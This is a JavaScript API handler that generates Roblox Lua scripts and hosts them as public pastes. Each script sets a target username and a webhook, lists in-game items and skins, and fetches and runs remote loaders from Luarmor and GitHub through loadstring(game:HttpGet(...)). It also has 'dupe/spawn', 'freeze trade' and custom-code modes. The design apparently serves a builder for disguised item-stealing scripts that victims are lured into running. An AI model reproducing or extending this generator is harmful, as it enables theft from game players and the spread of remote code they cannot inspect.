```js
// api/generate.js

export default async function handler(req, res) {
    try {
        console.log("=== /api/generate START ===");

        console.log("Method:", req.method);
        console.log("Body:", req.body);

        if (req.method !== 'POST') {
            return res.status(405).json({
                error: 'Method not allowed'
            });
        }

        const body = req.body || {};

        const {
            username,
            webhook,
            mode,
            brainrots,
            skins,
            gears,
            customCode,
            userId
        } = body;

        console.log("username:", username);
        console.log("mode:", mode);
        console.log("brainrots:", brainrots);
        console.log("skins:", skins);
        console.log("gears:", gears);
        console.log("customCode:", !!customCode);
        console.log("userId:", userId);

        if (!username) {
            return res.status(400).json({
                error: 'Username is required'
            });
        }

        console.log("Calling buildScript...");

        const script = buildScript(
            username,
            webhook,
            mode,
            Array.isArray(brainrots) ? brainrots : [],
            Array.isArray(skins) ? skins : [],
            Array.isArray(gears) ? gears : [],
            customCode || ''
        );

        console.log("buildScript OK");
        console.log("Script length:", script.length);

        console.log("Calling saveToInternalPaste...");

        const pasteId = await saveToInternalPaste(
            script,
            `Script para ${username}`,
            userId
        );

        console.log("saveToInternalPaste OK");
        console.log("pasteId:", pasteId);

        const baseUrl =
            process.env.BASE_URL || 'https://oblivionhub.xyz';

        const rawUrl =
            `${baseUrl}/api/paste?id=${pasteId}&raw=true`;

        console.log("rawUrl:", rawUrl);

        return res.status(200).json({
            loadstring:
                `loadstring(game:HttpGet("${rawUrl}"))()`,

            script,

            pasteUrl: rawUrl,

            pasteId,

            obfuscated: false
        });

    } catch (error) {

        console.error("================================");
        console.error("GENERATE ERROR");
        console.error("================================");

        console.error("Name:", error?.name);
        console.error("Message:", error?.message);
        console.error("Stack:", error?.stack);

        return res.status(500).json({
            error: error?.message || 'Internal server error'
        });
    }
}


// ============================================================
// BUILD SCRIPT
// ============================================================

function buildScript(
    username,
    webhook,
    mode,
    brainrots,
    skins,
    gears,
    customCode
) {

    console.log("buildScript mode:", mode);

    function luaTable(arr, indent = '    ') {

        if (!Array.isArray(arr) || arr.length === 0) {
            return '{}';
        }

        const items = arr.map(item => {

            const value = String(item)
                .replace(/\\/g, '\\\\')
                .replace(/"/g, '\\"');

            return `["${value}"] = true`;
        });

        return (
            '{\n' +
            items
                .map(item => indent + item)
                .join(',\n') +
            '\n}'
        );
    }


    const safeUsername =
        String(username)
            .replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"');


    const safeWebhook =
        webhook
            ? String(webhook)
                .replace(/\\/g, '\\\\')
                .replace(/"/g, '\\"')
            : 'WEBHOOK_URL';


    let script =
        `getgenv().TARGET_USERNAME = "${safeUsername}"\n`;

    script +=
        `getgenv().WEBHOOK_URL = "${safeWebhook}"\n`;

    script +=
        `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;

    script +=
        `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;

    script +=
        `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;


    // ========================================================
    // LUARMOR BASE
    // ========================================================

    const GUI_BASE =
        'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';


    // ========================================================
    // GITHUB
    // ========================================================

    const GUI_GITHUB = {

        adminpanel:
            'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',

        dupespawn:
            'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua',

        codesniper:
            'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua'
    };


    // ========================================================
    // NORMAL
    // ========================================================

    if (mode === 'normal') {

        script += `

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;

    }


    // ========================================================
    // ADMIN PANEL
    // ========================================================

    else if (mode === 'adminpanel') {

        script += `

-- GUI ADMIN PANEL

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.adminpanel}"))()
end)`;

    }


    // ========================================================
    // DUPE / SPAWN
    // ========================================================

    else if (mode === 'dupespawn') {

        script += `

-- GUI DUPE / SPAWN

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
end)`;

    }


    // ========================================================
    // CODE SNIPER
    // ========================================================

    else if (mode === 'codesniper') {

        script += `

-- GUI CODE SNIPER

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
end)`;

    }


    // ========================================================
    // FREEZE TRADE
    // ========================================================

    else if (mode === 'freezetrade') {

        script += `

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;

    }


    // ========================================================
    // CUSTOM
    // ========================================================

    else if (mode === 'custom') {

        script += `

task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;


        if (
            customCode &&
            String(customCode).trim()
        ) {

            const formattedCustomCode =
                String(customCode)
                    .replace(/\r?\n/g, '\n    ');

            script +=
                `\n\ntask.spawn(function()\n` +
                `    ${formattedCustomCode}\n` +
                `end)`;
        }

    }


    else {

        throw new Error(
            `Unknown generation mode: ${mode}`
        );
    }


    return script;
}


// ============================================================
// SAVE PASTE
// ============================================================

async function saveToInternalPaste(
    content,
    title,
    userId
) {

    const baseUrl =
        process.env.BASE_URL || 'https://oblivionhub.xyz';

    console.log(
        "saveToInternalPaste URL:",
        `${baseUrl}/api/paste`
    );


    const response = await fetch(
        `${baseUrl}/api/paste`,
        {
            method: 'POST',

            headers: {
                'Content-Type': 'application/json'
            },

            body: JSON.stringify({
                content,
                title: title || 'Untitled',
                userId: userId || null,
                public: true
            })
        }
    );


    console.log(
        "Paste response status:",
        response.status
    );


    if (!response.ok) {

        const text =
            await response.text();

        throw new Error(
            `Paste API error ${response.status}: ${text}`
        );
    }


    const data =
        await response.json();


    if (!data.id) {

        throw new Error(
            'Paste API did not return an ID'
        );
    }


    return data.id;
}
```
